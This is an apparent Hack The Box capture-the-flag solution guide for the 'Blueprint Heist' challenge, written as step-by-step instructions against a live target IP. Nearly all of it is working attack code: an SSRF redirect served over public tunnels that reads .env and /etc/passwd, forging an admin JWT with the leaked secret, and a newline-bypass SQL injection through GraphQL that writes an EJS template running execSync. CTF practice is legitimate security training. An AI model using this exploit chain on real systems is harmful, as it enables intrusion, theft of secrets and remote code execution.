# Blueprint Heist - Final Instructions to Get the Flag

## Current Status

✅ All code analysis complete  
✅ Exploit script ready  
✅ PHP redirect server running  
✅ Ngrok tunnel connected  
❌ Ngrok free tier blocks with interstitial page  

## The Issue

Ngrok free tier shows a "visit site" warning page that breaks the HTTP redirect exploit. We need an alternative tunneling service without this limitation.

## SOLUTION: Use Cloudflare Tunnel (Easiest!)

### Step 1: Install Cloudflare Tunnel

```bash
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
```

### Step 2: Start the Tunnel

```bash
# Make sure PHP server is running
cd /tmp && php -S 0.0.0.0:8000 &

# Start Cloudflare tunnel
cloudflared tunnel --url http://localhost:8000
```

**You'll see output like:**
```
Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):
https://abc-def-ghi-jkl.trycloudflare.com
```

**Copy that URL!**

### Step 3: Run the Exploit

```bash
# Run the exploit with your Cloudflare URL
/tmp/run_exploit.sh "https://YOUR-URL.trycloudflare.com"
```

### Step 4: Get the Flag! 🎉

The script will:
1. ✅ Read `.env` via HTTP redirect
2. ✅ Extract JWT secret  
3. ✅ Forge admin token
4. ✅ Inject SQL payload via GraphQL
5. ✅ Write malicious EJS template
6. ✅ Trigger 404 error
7. ✅ Execute `/readflag`
8. ✅ **Display the flag!**

---

## Alternative: localhost.run (No Installation)

If Cloudflare doesn't work, try:

```bash
# Terminal 1: PHP server
cd /tmp && php -S 0.0.0.0:8000

# Terminal 2: SSH tunnel
ssh -R 80:localhost:8000 nokey@localhost.run

# Look for the URL in the output
# Then run: /tmp/run_exploit.sh "https://YOUR-URL.localhost.run"
```

---

## Manual Exploit Steps (If Automated Script Fails)

### 1. Read .env
```bash
GUEST_TOKEN=$(curl -s http://94.237.59.225:55358/getToken)

curl -X POST "http://94.237.59.225:55358/download?token=$GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://YOUR-URL/redirect.php?file=/app/.env"}' \
  --output env.pdf

pdftotext env.pdf -
# Look for: secret=IM_Sup3r_K3y_pl3ase_b3_c4r3ful?
```

### 2. Forge Admin Token
```python
import jwt
secret = "IM_Sup3r_K3y_pl3ase_b3_c4r3ful?"  # From .env
token = jwt.encode({"role": "admin"}, secret, algorithm="HS256")
print(token)
```

### 3. SQL Injection Payload
```bash
# The newline bypass payload:
SQL_PAYLOAD="test
%' UNION SELECT 1,'<%= global.process.mainModule.require(\"child_process\").execSync(\"/readflag\") %>',3 INTO OUTFILE '/app/views/errors/404.ejs' -- -"

# URL encode it
python3 -c "import urllib.parse; print(urllib.parse.quote('''$SQL_PAYLOAD'''))"
```

### 4. Inject via GraphQL
```bash
ADMIN_TOKEN="your_forged_token"
ENCODED_PAYLOAD="your_encoded_payload"

curl -X POST "http://94.237.59.225:55358/download?token=$GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"http://127.0.0.1:1337/graphql?token=$ADMIN_TOKEN&query={getDataByName(name:\\\"$ENCODED_PAYLOAD\\\"){name}}\"}" \
  --output inject.pdf
```

### 5. Trigger the Flag
```bash
curl "http://94.237.59.225:55358/nonexistent"
# Flag should appear in the response!
```

---

## Quick Reference

**Target:** `94.237.59.225:55358`  
**PHP Server:** Running on `localhost:8000`  
**Redirect Script:** `/tmp/redirect.php`  
**Exploit Script:** `/tmp/run_exploit.sh`  

**Files Created:**
- `/tmp/redirect.php` - HTTP to file:// redirector
- `/tmp/run_exploit.sh` - Automated exploit
- `COMPLETE_SOLUTION.md` - Full writeup
- `exploit.sh` - Backup exploit script

---

## Troubleshooting

**Problem:** Empty PDF when reading .env  
**Solution:** Tunnel service has interstitial page, use Cloudflare Tunnel

**Problem:** SQL injection fails  
**Solution:** Check that newline (`\n` or `%0A`) is in the payload

**Problem:** No flag appears  
**Solution:** Template might not have been written, check MySQL permissions

**Problem:** 404.ejs already exists  
**Solution:** Use a different error code like `405.ejs` or `418.ejs`

---

## Expected Flag Format

```
HTB{...some_random_string...}
```

The flag will be output when you successfully access any non-existent route after injecting the template.

---

## Need Help?

1. Make sure PHP server is running: `ps aux | grep "php -S"`
2. Make sure tunnel is working: `curl https://your-tunnel-url/test.txt`
3. Test redirect: `curl -I https://your-tunnel-url/redirect.php?file=/etc/passwd`
4. Check exploit script: `cat /tmp/run_exploit.sh`

Good luck! 🚀
